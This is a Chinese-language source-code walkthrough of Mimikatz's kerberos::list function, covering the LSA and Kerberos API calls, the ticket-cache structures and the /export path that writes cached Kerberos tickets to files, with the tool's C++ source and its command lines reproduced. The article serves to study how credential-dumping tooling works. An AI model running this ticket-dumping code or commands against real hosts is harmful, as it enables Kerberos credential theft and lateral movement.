Mimikatz Explorer - Kerberos List
=================================

\[toc\]

Mimikatz 的 `kerberos::list` 功能可以在线从当前主机的缓存中列出并转储 Kerberos 票据。

TL;DR
=====

LsaConnectUntrusted
-------------------

[LsaConnectUntrusted](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsaconnectuntrusted) 函数用于与 LSA 服务器建立不受信任的连接，它不验证有关调用方的任何信息。

该函数语法如下：

```cpp
NTSTATUS LsaConnectUntrusted(
  [out] PHANDLE LsaHandle
);
```

- \[out\] LsaHandle：指向接收连接句柄的句柄的指针，该句柄必须在将来的身份验证服务中提供。

如果应用程序需从身份验证包查询信息，则可以在调用 LsaCallAuthenticationPackage 和 LsaLookupAuthenticationPackage 时使用此函数返回的句柄。

LsaLookupAuthenticationPackage
------------------------------

[LsaLookupAuthenticationPackage](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsalookupauthenticationpackage) 函数用于获取身份验证包的唯一标识符。身份验证包标识符用于调用身份验证函数，例如 LsaLogonUser 和 LsaCallAuthenticationPackage 函数。

该函数语法如下：

```cpp
NTSTATUS LsaLookupAuthenticationPackage(
  [in]  HANDLE      LsaHandle,
  [in]  PLSA_STRING PackageName,
  [out] PULONG      AuthenticationPackage
);
```

- \[in\] LsaHandle：从上一次调用 LsaRegisterLogonProcess 或 LsaConnectUntrusted 获取的句柄。
- \[in\] PackageName：指向指定身份验证包名称的 LSA\_STRING 结构的指针。下表列出了 Microsoft 提供的身份验证包的名称。

| Value | 含义 |
|---|---|
| MSV1\_0\_PACKAGE\_NAME | MSV1\_0身份验证包名称的 ANSI 版本。 |
| MICROSOFT\_KERBEROS\_NAME\_A | Kerberos 身份验证包名称的 ANSI 版本。 |
| NEGOSSP\_NAME\_A | 协商身份验证包名称的 ANSI 版本。 |

- \[out\] AuthenticationPackage：指向接收身份验证包标识符的 ULONG 的指针。

LsaCallAuthenticationPackage
----------------------------

在 Windows 系统中，登录应用程序使用 [LsaCallAuthenticationPackage](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsacallauthenticationpackage) 函数与身份验证包通信。此函数通常用于访问身份验证包提供的服务。

该函数语法如下：

```cpp
NTSTATUS LsaCallAuthenticationPackage(
  [in]  HANDLE    LsaHandle,
  [in]  ULONG     AuthenticationPackage,
  [in]  PVOID     ProtocolSubmitBuffer,
  [in]  ULONG     SubmitBufferLength,
  [out] PVOID     *ProtocolReturnBuffer,
  [out] PULONG    ReturnBufferLength,
  [out] PNTSTATUS ProtocolStatus
);
```

- \[in\] LsaHandle：从上一次调用 LsaRegisterLogonProcess 或 LsaConnectUntrusted 获取的句柄。
- \[in\] AuthenticationPackage：提供身份验证包的标识符。此值是通过调用 LsaLookupAuthenticationPackage 函数获取的。
- \[in\] ProtocolSubmitBuffer：传递给身份验证包的特定于身份验证包的消息缓冲区。
- \[in\] SubmitBufferLength：指示 ProtocolSubmitBuffer 缓冲区的长度（以字节为单位）。
- \[out\] ProtocolReturnBuffer：一个指针，指向接收身份验证包返回的缓冲区的地址。
- \[out\] ReturnBufferLength：指向 ULONG 的指针，该 ULONG 接收返回的缓冲区的长度（以字节为单位）。
- \[out\] ProtocolStatus：如果函数成功，此参数将接收 NTSTATUS 代码，该代码指示身份验证包的完成状态。

Mimikatz Kerberos 模块中的大多数功能都是通过 LsaConnectUntrusted、LsaLookupAuthenticationPackage 和 LsaCallAuthenticationPackage 函数的系列调用实现与 Kerberos 包的通信。

KERB\_PROTOCOL\_MESSAGE\_TYPE
-----------------------------

[KERB\_PROTOCOL\_MESSAGE\_TYPE](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ne-ntsecapi-kerb_protocol_message_type) 枚举列出了可以通过调用 LsaCallAuthenticationPackage 函数发送到 Kerberos 身份验证包的消息类型，也就是 ProtocolSubmitBuffer 缓冲区的格式和内容。每个消息对应于调度例程，并导致 Kerberos 身份验证包执行不同的任务。

```cpp
typedef enum _KERB_PROTOCOL_MESSAGE_TYPE {
  KerbDebugRequestMessage = 0,
  KerbQueryTicketCacheMessage,
  KerbChangeMachinePasswordMessage,
  KerbVerifyPacMessage,
  KerbRetrieveTicketMessage,
  KerbUpdateAddressesMessage,
  KerbPurgeTicketCacheMessage,
  KerbChangePasswordMessage,
  KerbRetrieveEncodedTicketMessage,
  KerbDecryptDataMessage,
  KerbAddBindingCacheEntryMessage,
  KerbSetPasswordMessage,
  KerbSetPasswordExMessage,
  KerbAddExtraCredentialsMessage = 17,
  KerbQueryTicketCacheExMessage,
  KerbPurgeTicketCacheExMessage,
  KerbRefreshSmartcardCredentialsMessage,
  KerbAddExtraCredentialsMessage = 17,
  KerbQuerySupplementalCredentialsMessage,
  KerbTransferCredentialsMessage,
  KerbQueryTicketCacheEx2Message,
  KerbSubmitTicketMessage,
  KerbAddExtraCredentialsExMessage,
  KerbQueryKdcProxyCacheMessage,
  KerbPurgeKdcProxyCacheMessage,
  KerbQueryTicketCacheEx3Message,
  KerbCleanupMachinePkinitCredsMessage,
  KerbAddBindingCacheEntryExMessage,
  KerbQueryBindingCacheMessage,
  KerbPurgeBindingCacheMessage,
  KerbPinKdcMessage,
  KerbUnpinAllKdcsMessage,
  KerbQueryDomainExtendedPoliciesMessage,
  KerbQueryS4U2ProxyCacheMessage,
  KerbRetrieveKeyTabMessage,
  KerbRefreshPolicyMessage,
  KerbPrintCloudKerberosDebugMessage
} KERB_PROTOCOL_MESSAGE_TYPE, *PKERB_PROTOCOL_MESSAGE_TYPE;
```

在 `kerberos::list` 模块中使用的消息类型为 KerbQueryTicketCacheExMessage 和 KerbRetrieveEncodedTicketMessage。

KerbQueryTicketCacheExMessage 调度例程返回有关指定用户登录会话的所有缓存票证的信息，包括客户端名称和领域等。

KerbRetrieveEncodedTicketMessage 消息从缓存中检索指定的票证（如果已存在），或者从 Kerberos 密钥分发中心 (KDC) 请求该票证。

在调用 LsaCallAuthenticationPackage 函数时，需要将 KerbQueryTicketCacheExMessage 封装到 KERB\_QUERY\_TKT\_CACHE\_REQUEST 结构中。KerbRetrieveEncodedTicketMessage 需要被封装到 KERB\_RETRIEVE\_TKT\_REQUEST 结构中。

KERB\_QUERY\_TKT\_CACHE\_REQUEST
--------------------------------

[KERB\_QUERY\_TKT\_CACHE\_REQUEST](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ns-ntsecapi-kerb_query_tkt_cache_request) 结构包含用于查询票证缓存的信息。还有很多类似的结构，用于 LsaCallAuthenticationPackage 执行不同的任务，例如 KERB\_RETRIEVE\_TKT\_REQUEST，其余的我们将在后续文章中进行介绍。

该结构的语法如下：

```cpp
typedef struct _KERB_QUERY_TKT_CACHE_REQUEST {
  KERB_PROTOCOL_MESSAGE_TYPE MessageType;
  LUID                       LogonId;
} KERB_QUERY_TKT_CACHE_REQUEST, *PKERB_QUERY_TKT_CACHE_REQUEST;
```

- MessageType：标识正在发出的请求类型的 KERB\_PROTOCOL\_MESSAGE\_TYPE 值。此成员必须设置为 KerbQueryTicketCacheMessage、KerbQueryTicketCacheExMessage 或 KerbRetrieveTicketMessage。
    
    如果此成员设置为 KerbQueryTicketCacheMessage，则请求用于获取有关指定用户登录会话的所有缓存票证的信息。如果它设置为 KerbRetrieveTicketMessage，则请求是从指定用户登录会话的票证缓存中获取票证授予票证。
- LogonId：对于当前用户的登录会话，这可以为零。如果不是零，则调用方必须具有 SeTcbPrivilege 特权集。

通过 KERB\_QUERY\_TKT\_CACHE\_REQUEST 结构发送请求查询到的票据信息可以保存到 KERB\_QUERY\_TKT\_CACHE\_EX\_RESPONSE 结构体中。

KERB\_QUERY\_TKT\_CACHE\_EX\_RESPONSE
-------------------------------------

KERB\_QUERY\_TKT\_CACHE\_EX\_RESPONSE 结构包含查询票证缓存的结果。它由 LsaCallAuthenticationPackage 函数使用。

KERB\_QUERY\_TKT\_CACHE\_EX\_RESPONSE 是 KERB\_QUERY\_TKT\_CACHE\_RESPONSE 结构的扩展。它没有公开在微软文档中，其语法如下：

```cpp
typedef struct _KERB_QUERY_TKT_CACHE_EX_RESPONSE {
    KERB_PROTOCOL_MESSAGE_TYPE MessageType;
    ULONG CountOfTickets;
    KERB_TICKET_CACHE_INFO_EX Tickets[ANYSIZE_ARRAY];
} KERB_QUERY_TKT_CACHE_EX_RESPONSE, *PKERB_QUERY_TKT_CACHE_EX_RESPONSE;
```

- MessageType：标识所发出请求类型的 KERB\_PROTOCOL\_MESSAGE\_TYPE 值。
- CountOfTickets：Tickets 数组中的票证数。
- Tickets\[ANYSIZE\_ARRAY\]：KERB\_TICKET\_CACHE\_INFO\_EX 结构的，长度为 CountOfTickets 的数组，数组中每个成员都包含一个票据的信息。

KERB\_TICKET\_CACHE\_INFO\_EX 是 KERB\_TICKET\_CACHE\_INFO 结构的扩展，包含有关缓存 Kerberos 票证的信息，可用于检索票证和查询票证缓存。KERB\_TICKET\_CACHE\_INFO\_EX 结构没有公开在微软文档中，其语法如下：

```cpp
typedef struct _KERB_TICKET_CACHE_INFO_EX {
    UNICODE_STRING ClientName;
    UNICODE_STRING ClientRealm;
    UNICODE_STRING ServerName;
    UNICODE_STRING ServerRealm;
    LARGE_INTEGER StartTime;
    LARGE_INTEGER EndTime;
    LARGE_INTEGER RenewTime;
    LONG EncryptionType;
    ULONG TicketFlags;
} KERB_TICKET_CACHE_INFO_EX, *PKERB_TICKET_CACHE_INFO_EX;
```

- ClientName：包含票证适用的客户端名称的 UNICODE\_STRING。
- ClientRealm：包含票证适用的客户端领域名称的 UNICODE\_STRING。
- ServerName：包含票证适用的服务器名称的 UNICODE\_STRING。此名称与 RealmName 值组合在一起，以创建全名 ServerName@RealmName。
- RealmName：包含票证适用的服务器领域名称的 UNICODE\_STRING。
- StartTime：包含票证生效时间的 FILETIME 结构。
- EndTime：包含票证到期时间的 FILETIME 结构。
- RenewTime：如果在 TicketFlags 中设置了KERB\_TICKET\_FLAGS\_renewable，则此成员是包含无法续订票证的时间的 FILETIME 结构。
- EncryptionType：票证中使用的加密类型。
- TicketFlags：票证标志，如 Internet [RFC 4120](http://www.ietf.org/rfc/rfc4120.txt) 中定义。

KERB\_RETRIEVE\_TKT\_REQUEST
----------------------------

[KERB\_RETRIEVE\_TKT\_REQUEST](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ns-ntsecapi-kerb_retrieve_tkt_request) 结构包含用于检索票证的信息。

该结构语法如下：

```cpp
typedef struct _KERB_RETRIEVE_TKT_REQUEST {
  KERB_PROTOCOL_MESSAGE_TYPE MessageType;
  LUID                       LogonId;
  UNICODE_STRING             TargetName;
  ULONG                      TicketFlags;
  ULONG                      CacheOptions;
  LONG                       EncryptionType;
  SecHandle                  CredentialsHandle;
} KERB_RETRIEVE_TKT_REQUEST, *PKERB_RETRIEVE_TKT_REQUEST;
```

- MessageType：KERB\_PROTOCOL\_MESSAGE\_TYPE 值，指示正在发出请求的类型。此成员必须设置为 KerbRetrieveEncodedTicketMessage。
- LogonId：包含登录会话标识符的 LUID 结构。
- TargetName：包含目标服务名称的 UNICODE\_STRING。
- TicketFlags：包含指定检索票证用途的标志。
- CacheOptions：指示用于搜索缓存的选项。将此成员设置为零，以指示应在缓存中搜索缓存；如果未找到票证，则应请求新票证。CacheOptions 可以包含以下值。

| Value | 含义 |
|---|---|
| KERB\_RETRIEVE\_TICKET\_DONT\_USE\_CACHE (1) | 始终请求新票证，不要搜索缓存。 |
| KERB\_RETRIEVE\_TICKET\_USE\_CREDHANDLE (4) | 使用 CredentialsHandle 成员而不是 LogonId 标识登录会话。 |
| KERB\_RETRIEVE\_TICKET\_USE\_CACHE\_ONLY (2) | 仅返回以前缓存的票证。 |
| KERB\_RETRIEVE\_TICKET\_AS\_KERB\_CRED (8) | 以 Kerberos 凭据（KERB\_CRED）的形式返回票证，用于凭据的转储。 |
| KERB\_RETRIEVE\_TICKET\_WITH\_SEC\_CRED (10) | 未实现。 |
| KERB\_RETRIEVE\_TICKET\_CACHE\_TICKET (20) | 返回当前位于缓存中的票证。如果票证不在缓存中，则请求并缓存该票证。 |
| KERB\_RETRIEVE\_TICKET\_MAX\_LIFETIME (40) | 返回策略允许的最大时间的新票证。 |

- EncryptionType：指定要用于请求票证的加密类型。
- CredentialsHandle：用于代替登录会话标识符的 SSPI 凭据句柄。

KERB\_RETRIEVE\_TKT\_RESPONSE
-----------------------------

[KERB\_RETRIEVE\_TKT\_RESPONSE](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ns-ntsecapi-kerb_retrieve_tkt_response) 结构包含从 KERB\_RETRIEVE\_TKT\_REQUEST 结构构造的请求中检索票证的响应。

该结构语法如下：

```cpp
typedef struct _KERB_RETRIEVE_TKT_RESPONSE {
  KERB_EXTERNAL_TICKET Ticket;
} KERB_RETRIEVE_TKT_RESPONSE, *PKERB_RETRIEVE_TKT_RESPONSE;
```

- Ticket：包含所请求票证的 KERB\_EXTERNAL\_TICKET 结构。[KERB\_EXTERNAL\_TICKET](https://learn.microsoft.com/en-us/windows/win32/api/ntsecapi/ns-ntsecapi-kerb_external_ticket) 结构包含有关外部票证的信息，外部票证是导出给外部用户的 Kerberos 票证，其语法如下。

```cpp
typedef struct _KERB_EXTERNAL_TICKET {
  PKERB_EXTERNAL_NAME ServiceName;
  PKERB_EXTERNAL_NAME TargetName;
  PKERB_EXTERNAL_NAME ClientName;
  UNICODE_STRING      DomainName;
  UNICODE_STRING      TargetDomainName;
  UNICODE_STRING      AltTargetDomainName;
  KERB_CRYPTO_KEY     SessionKey;
  ULONG               TicketFlags;
  ULONG               Flags;
  LARGE_INTEGER       KeyExpirationTime;
  LARGE_INTEGER       StartTime;
  LARGE_INTEGER       EndTime;
  LARGE_INTEGER       RenewUntil;
  LARGE_INTEGER       TimeSkew;
  ULONG               EncodedTicketSize;
  PUCHAR              EncodedTicket;
} KERB_EXTERNAL_TICKET, *PKERB_EXTERNAL_TICKET;
```

这里只介绍 KERB\_EXTERNAL\_TICKET 结构的 EncodedTicket 成员，其余成员请自行查阅微软文档。该成员包含 ASN.1 编码票证的缓冲区，也就是票据的二进制数据，该数据可以保存到文件中，也可以通过 Base64 编码后打印出来。

Main Detail
===========

根据 `list` 功能的名称找到其入口函数 `kuhl_m_kerberos_list()`：

- kerberos\\kuhl\_m\_kerberos.c

```cpp
NTSTATUS kuhl_m_kerberos_list(int argc, wchar_t* argv[])
{
    NTSTATUS status, packageStatus;
    KERB_QUERY_TKT_CACHE_REQUEST kerbCacheRequest = { KerbQueryTicketCacheExMessage, {0, 0} };
    PKERB_QUERY_TKT_CACHE_EX_RESPONSE pKerbCacheResponse;
    PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveRequest;
    PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResponse;
    DWORD szData, i;
    wchar_t* filename;
    BOOL export = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);

    status = LsaCallKerberosPackage(&kerbCacheRequest, sizeof(KERB_QUERY_TKT_CACHE_REQUEST), (PVOID*)&pKerbCacheResponse, &szData, &packageStatus);
    if (NT_SUCCESS(status))
    {
        if (NT_SUCCESS(packageStatus))
        {
            for (i = 0; i < pKerbCacheResponse->CountOfTickets; i++)
            {
                kprintf(L"\n[%08x] - 0x%08x - %s", i, pKerbCacheResponse->Tickets[i].EncryptionType, kuhl_m_kerberos_ticket_etype(pKerbCacheResponse->Tickets[i].EncryptionType));
                kprintf(L"\n   Start/End/MaxRenew: ");
                kull_m_string_displayLocalFileTime((PFILETIME)&pKerbCacheResponse->Tickets[i].StartTime); kprintf(L" ; ");
                kull_m_string_displayLocalFileTime((PFILETIME)&pKerbCacheResponse->Tickets[i].EndTime); kprintf(L" ; ");
                kull_m_string_displayLocalFileTime((PFILETIME)&pKerbCacheResponse->Tickets[i].RenewTime);
                kprintf(L"\n   Server Name       : %wZ @ %wZ", &pKerbCacheResponse->Tickets[i].ServerName, &pKerbCacheResponse->Tickets[i].ServerRealm);
                kprintf(L"\n   Client Name       : %wZ @ %wZ", &pKerbCacheResponse->Tickets[i].ClientName, &pKerbCacheResponse->Tickets[i].ClientRealm);
                kprintf(L"\n   Flags %08x    : ", pKerbCacheResponse->Tickets[i].TicketFlags);
                kuhl_m_kerberos_ticket_displayFlags(pKerbCacheResponse->Tickets[i].TicketFlags);

                if (export)
                {
                    szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + pKerbCacheResponse->Tickets[i].ServerName.MaximumLength;
                    if (pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST)LocalAlloc(LPTR, szData)) // LPTR implicates KERB_ETYPE_NULL
                    {
                        pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
                        pKerbRetrieveRequest->CacheOptions = /*KERB_RETRIEVE_TICKET_USE_CACHE_ONLY | */KERB_RETRIEVE_TICKET_AS_KERB_CRED;
                        pKerbRetrieveRequest->TicketFlags = pKerbCacheResponse->Tickets[i].TicketFlags;
                        pKerbRetrieveRequest->TargetName = pKerbCacheResponse->Tickets[i].ServerName;
                        pKerbRetrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
                        RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, pKerbCacheResponse->Tickets[i].ServerName.Buffer, pKerbRetrieveRequest->TargetName.MaximumLength);

                        status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID*)&pKerbRetrieveResponse, &szData, &packageStatus);
                        if (NT_SUCCESS(status))
                        {
                            if (NT_SUCCESS(packageStatus))
                            {
                                if (filename = kuhl_m_kerberos_generateFileName(i, &pKerbCacheResponse->Tickets[i], MIMIKATZ_KERBEROS_EXT))
                                {
                                    if (kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
                                        kprintf(L"\n   * Saved to file     : %s", filename);
                                    else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
                                    LocalFree(filename);
                                }
                                LsaFreeReturnBuffer(pKerbRetrieveResponse);
                            }
                            else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
                        }
                        else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage : %08x\n", status);

                        LocalFree(pKerbRetrieveRequest);
                    }
                }
                kprintf(L"\n");
            }
            LsaFreeReturnBuffer(pKerbCacheResponse);
        }
        else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbQueryTicketCacheEx2Message / Package : %08x\n", packageStatus);
    }
    else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbQueryTicketCacheEx2Message : %08x\n", status);

    return STATUS_SUCCESS;
}
```

该函数首先声明了需要用到的结构，其中 KERB\_QUERY\_TKT\_CACHE\_REQUEST 和 KERB\_QUERY\_TKT\_CACHE\_EX\_RESPONSE 用于列出缓存的票据。KERB\_RETRIEVE\_TKT\_REQUEST 和 KERB\_RETRIEVE\_TKT\_RESPONSE 用于票据的转储。

List All Tickets
----------------

如果只是列出当前用户缓存的票据，则先通过 KerbQueryTicketCacheExMessage 消息构造 KERB\_QUERY\_TKT\_CACHE\_REQUEST 结构，用于查询票证缓存的信息，如下所示。

```cpp
KERB_QUERY_TKT_CACHE_REQUEST kerbCacheRequest = { KerbQueryTicketCacheExMessage, {0, 0} };
```

然后通过调用 LsaCallKerberosPackage 函数发出查询请求，返回有关指定用户登录会话的所有缓存票证的信息，如下所示。

```cpp
status = LsaCallKerberosPackage(&kerbCacheRequest, sizeof(KERB_QUERY_TKT_CACHE_REQUEST), (PVOID*)&pKerbCacheResponse, &szData, &packageStatus);
```

LsaCallKerberosPackage 函数是对 LsaCallAuthenticationPackage 函数的封装。如下所示，LsaCallKerberosPackage 在内部调用 LsaCallAuthenticationPackage。

```cpp
NTSTATUS LsaCallKerberosPackage(PVOID ProtocolSubmitBuffer, ULONG SubmitBufferLength, PVOID* ProtocolReturnBuffer, PULONG ReturnBufferLength, PNTSTATUS ProtocolStatus)
{
    NTSTATUS status = STATUS_HANDLE_NO_LONGER_VALID;
    if (g_hLSA && g_isAuthPackageKerberos)
        status = LsaCallAuthenticationPackage(g_hLSA, g_AuthenticationPackageId_Kerberos, ProtocolSubmitBuffer, SubmitBufferLength, ProtocolReturnBuffer, ReturnBufferLength, ProtocolStatus);
    return status;
}
```

在调用 LsaCallAuthenticationPackage 函数之前，需要先调用 kuhl\_m\_kerberos\_init 函数进行初始化。kuhl\_m\_kerberos\_init 函数通过 LsaConnectUntrusted 和 LsaLookupAuthenticationPackage 函数与 LSA 服务器建立不受信任的连接，并获取 Kerberos 身份验证包的唯一标识符，如下所示。

```cpp
TRING   kerberosPackageName = { 8, 9, MICROSOFT_KERBEROS_NAME_A };
DWORD   g_AuthenticationPackageId_Kerberos = 0;
BOOL    g_isAuthPackageKerberos = FALSE;
HANDLE  g_hLSA = NULL;

// ...

NTSTATUS kuhl_m_kerberos_init()
{
    NTSTATUS status = LsaConnectUntrusted(&g_hLSA);
    if (NT_SUCCESS(status))
    {
        status = LsaLookupAuthenticationPackage(g_hLSA, &kerberosPackageName, &g_AuthenticationPackageId_Kerberos);
        g_isAuthPackageKerberos = NT_SUCCESS(status);
    }
    return status;
}
```

LsaCallKerberosPackage 函数返回的票证查询结果将被保存到 KERB\_QUERY\_TKT\_CACHE\_EX\_RESPONSE 结构体指针 pKerbCacheResponse 所指向的内存中，最后通过遍历 pKerbCacheResponse 将每个票据的 EncryptionType、StartTime、EndTime、RenewTime、ServerName、ClientName 和 TicketFlags 等信息打印出来，如下所示。

```cpp
for (i = 0; i < pKerbCacheResponse->CountOfTickets; i++)
{
    kprintf(L"\n[%08x] - 0x%08x - %s", i, pKerbCacheResponse->Tickets[i].EncryptionType, kuhl_m_kerberos_ticket_etype(pKerbCacheResponse->Tickets[i].EncryptionType));
    kprintf(L"\n   Start/End/MaxRenew: ");
    kull_m_string_displayLocalFileTime((PFILETIME)&pKerbCacheResponse->Tickets[i].StartTime); kprintf(L" ; ");
    kull_m_string_displayLocalFileTime((PFILETIME)&pKerbCacheResponse->Tickets[i].EndTime); kprintf(L" ; ");
    kull_m_string_displayLocalFileTime((PFILETIME)&pKerbCacheResponse->Tickets[i].RenewTime);
    kprintf(L"\n   Server Name       : %wZ @ %wZ", &pKerbCacheResponse->Tickets[i].ServerName, &pKerbCacheResponse->Tickets[i].ServerRealm);
    kprintf(L"\n   Client Name       : %wZ @ %wZ", &pKerbCacheResponse->Tickets[i].ClientName, &pKerbCacheResponse->Tickets[i].ClientRealm);
    kprintf(L"\n   Flags %08x    : ", pKerbCacheResponse->Tickets[i].TicketFlags);
    kuhl_m_kerberos_ticket_displayFlags(pKerbCacheResponse->Tickets[i].TicketFlags);

    // ...

}
```

其中，kuhl\_m\_kerberos\_ticket\_displayFlags 函数定义如下：

```cpp
const PCWCHAR TicketFlagsToStrings[] = {
    L"name_canonicalize", L"?", L"ok_as_delegate", L"?",
    L"hw_authent", L"pre_authent", L"initial", L"renewable",
    L"invalid", L"postdated", L"may_postdate", L"proxy",
    L"proxiable", L"forwarded", L"forwardable", L"reserved",
};
void kuhl_m_kerberos_ticket_displayFlags(ULONG flags)
{
    DWORD i;
    for(i = 0; i < ARRAYSIZE(TicketFlagsToStrings); i++)
        if((flags >> (i + 16)) & 1)
            kprintf(L"%s ; ", TicketFlagsToStrings[i]);
}
```

该函数通过将票据标志位右移 i+16 位然后与 1 进行与运算（&amp;）来判断当前标志位是否为 1，如果为 1，则输出对应的标志位字符串。

最终执行效果如下：

```cmd
mimikatz.exe "kerberos::list" exit
```

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-c1cce938615ad0e5d169975125f2a4602285e685.png)

Export All Tickets
------------------

如果指定了 `/export` 选项，则转储当前用户缓存的所有票据。这里将使用前面声明的 KERB\_RETRIEVE\_TKT\_REQUEST 结构体 pKerbRetrieveRequest。

由于需要在 pKerbRetrieveRequest 中指定 TargetName，以筛选指定 TargetName 的票据，因此需要扩展 pKerbRetrieveRequest 的大小，如下所示。这里在 pKerbRetrieveRequest 原来 `sizeof(KERB_RETRIEVE_TKT_REQUEST)` 大小的基础上加了 `Tickets[i].ServerName.MaximumLength`。

```cpp
szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + pKerbCacheResponse->Tickets[i].ServerName.MaximumLength;
if (pKerbRetrieveRequest = (PKERB_RETRIEVE_TKT_REQUEST)LocalAlloc(LPTR, szData))
{
    // ...
}
```

然后开始设置 pKerbRetrieveRequest 的成员值，用于从缓存中筛选出符合指定条件的票据，如下所示。

```cpp
pKerbRetrieveRequest->MessageType = KerbRetrieveEncodedTicketMessage;
pKerbRetrieveRequest->CacheOptions = /*KERB_RETRIEVE_TICKET_USE_CACHE_ONLY | */KERB_RETRIEVE_TICKET_AS_KERB_CRED;
pKerbRetrieveRequest->TicketFlags = pKerbCacheResponse->Tickets[i].TicketFlags;
pKerbRetrieveRequest->TargetName = pKerbCacheResponse->Tickets[i].ServerName;
pKerbRetrieveRequest->TargetName.Buffer = (PWSTR)((PBYTE)pKerbRetrieveRequest + sizeof(KERB_RETRIEVE_TKT_REQUEST));
RtlCopyMemory(pKerbRetrieveRequest->TargetName.Buffer, pKerbCacheResponse->Tickets[i].ServerName.Buffer, pKerbRetrieveRequest->TargetName.MaximumLength);
```

接着，通过调用 LsaCallKerberosPackage 函数发出查询请求，检索当前用户登录会话的所有缓存票证，如下所示。

```cpp
status = LsaCallKerberosPackage(pKerbRetrieveRequest, szData, (PVOID*)&pKerbRetrieveResponse, &szData, &packageStatus);
```

返回的票据将被保存到 KERB\_RETRIEVE\_TKT\_RESPONSE 结构体指针 pKerbRetrieveResponse 所指向的内存中。

如果一切顺利，则通过一系列过程将票据保存到文件，如下所示。

```cpp
if (NT_SUCCESS(status))
{
    if (NT_SUCCESS(packageStatus))
    {
        if (filename = kuhl_m_kerberos_generateFileName(i, &pKerbCacheResponse->Tickets[i], MIMIKATZ_KERBEROS_EXT))
        {
            if (kull_m_file_writeData(filename, pKerbRetrieveResponse->Ticket.EncodedTicket, pKerbRetrieveResponse->Ticket.EncodedTicketSize))
                kprintf(L"\n   * Saved to file     : %s", filename);
            else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
                LocalFree(filename);
        }
        LsaFreeReturnBuffer(pKerbRetrieveResponse);
    }
    else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbRetrieveEncodedTicketMessage / Package : %08x\n", packageStatus);
}
```

其中，kuhl\_m\_kerberos\_generateFileName 函数用于设置保存到的文件名，该函数通过指定的TicketFlags、ClientName、ServerName 和 ServerRealm 值为票据文件命名，其定义如下所示。

```c++
wchar_t* kuhl_m_kerberos_generateFileName(const DWORD index, PKERB_TICKET_CACHE_INFO_EX ticket, LPCWSTR ext)
{
    wchar_t* buffer;
    size_t charCount = 0x1000;

    if (buffer = (wchar_t*)LocalAlloc(LPTR, charCount * sizeof(wchar_t)))
    {
        if (swprintf_s(buffer, charCount, L"%u-%08x-%wZ@%wZ-%wZ.%s", index, ticket->TicketFlags, &ticket->ClientName, &ticket->ServerName, &ticket->ServerRealm, ext) > 0)
            kull_m_file_cleanFilename(buffer);
        else
            buffer = (wchar_t*)LocalFree(buffer);
    }
    return buffer;
}
```

最后调用 kull\_m\_file\_writeData 函数，该函数定义如下。

```cpp
BOOL kull_m_file_writeData(PCWCHAR fileName, LPCVOID data, DWORD lenght)
{
    BOOL reussite = FALSE;
    DWORD dwBytesWritten = 0, i;
    HANDLE hFile = NULL;
    LPWSTR base64;

    if(isBase64InterceptOutput)
    {
        if(CryptBinaryToString((const BYTE *) data, lenght, CRYPT_STRING_BASE64, NULL, &dwBytesWritten))
        {
            if(base64 = (LPWSTR) LocalAlloc(LPTR, dwBytesWritten * sizeof(wchar_t)))
            {
                if(reussite = CryptBinaryToString((const BYTE *) data, lenght, CRYPT_STRING_BASE64, base64, &dwBytesWritten))
                {
                    kprintf(L"\n====================\nBase64 of file : %s\n====================\n", fileName);
                    for(i = 0; i < dwBytesWritten; i++)
                        kprintf(L"%c", base64[i]);
                    kprintf(L"====================\n");
                }
                LocalFree(base64);
            }
        }
    }
    else if((hFile = CreateFile(fileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL)) && hFile != INVALID_HANDLE_VALUE)
    {
        if(WriteFile(hFile, data, lenght, &dwBytesWritten, NULL) && (lenght == dwBytesWritten))
            reussite = FlushFileBuffers(hFile);
        CloseHandle(hFile);
    }
    return reussite;
}
```

这里，如果 isBase64InterceptOutput 为 TRUE，则通过 CryptBinaryToString 函数将票据数据转换为 Base64 编码后的字符串并打印出来。但是 isBase64InterceptOutput 默认为 FALSE，因此会调用 WriteFile 函数将票据数据写入文件。

最终执行效果如下：

```cmd
mimikatz.exe "kerberos::list /export" exit
```

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-3d56e6efa47687bfad1c0f05177dd39f61d8c841.png)

![](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-c4540cf3b16a2ac3bb155d51d55e340aecb9ccbe.png)